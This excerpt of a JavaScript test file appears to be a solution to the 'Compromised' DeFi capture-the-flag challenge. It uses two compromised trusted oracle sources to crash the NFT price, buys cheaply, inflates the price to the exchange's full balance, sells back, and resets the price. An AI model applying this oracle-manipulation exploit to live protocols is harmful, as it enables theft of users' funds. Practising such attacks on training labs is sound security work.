...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        await oracle.connect(trustedSource1).postPrice("DVNFT", ethers.utils.parseEther("0"));
        await oracle.connect(trustedSource2).postPrice("DVNFT", ethers.utils.parseEther("0"));

        const buyTx = await exchange.connect(player).buyOne({ value: ethers.utils.parseEther("0.01") });
        ...
        await oracle.connect(trustedSource1).postPrice("DVNFT", exchangeBalance);
        await oracle.connect(trustedSource2).postPrice("DVNFT", exchangeBalance);

        await nftToken.connect(player).approve(exchange.address, tokenId);
        await exchange.connect(player).sellOne(tokenId);

        await oracle.connect(trustedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await oracle.connect(trustedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE);
    });
